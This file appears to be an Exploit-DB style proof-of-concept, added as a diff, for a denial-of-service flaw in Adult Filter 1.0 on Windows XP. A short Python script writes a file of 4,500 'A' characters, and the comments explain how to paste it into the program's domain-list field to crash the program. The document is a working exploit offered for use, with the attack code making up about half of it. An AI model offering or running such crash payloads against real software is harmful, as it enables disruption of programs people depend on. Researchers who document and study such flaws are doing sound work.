@@ -1,0 +1,27 @@
+# Exploit Title: ADULT FILTER 1.0 - Denial of Service (PoC)
+# Date: 2018-10-28
+# Exploit Author: Beren Kuday GÃ–RÃœN
+# Vendor Homepage: http://www.armcode.com/adult-filter/
+# Software Link: http://www.armcode.com/downloads/adult-filter.exe
+# Version: 1.0 (Build 2007-Mar-12)
+# Tested on OS: Windows XP Professional sp3 (ENG)
+
+# Steps to Reproduce: Run the python3 exploit script, it will create a new
+# file with the name "boom_for_Adult_Filter.txt". Copy the content of the
+# new file "boom_for_Adult_Filter.txt". Now start the program. When you
+# open the program, select 'Options >> Black Domain List ...' from the
+# menu item. In the window that opens, enter the text in the file you
+# created with python3 script the 'Add the domain list' section. 
+# Press the 'Add' button and then press the 'OK' button.
+# And see a crash!
+
+buffer = "A" * 4500
+
+try:
+	file = open("boom_for_Adult_Filter.txt","w")
+	file.write(buffer)
+	file.close()
+	print("[*] Ready for Denial of Service")
+	
+except:
+	print("[*] Error: Failed to create file")
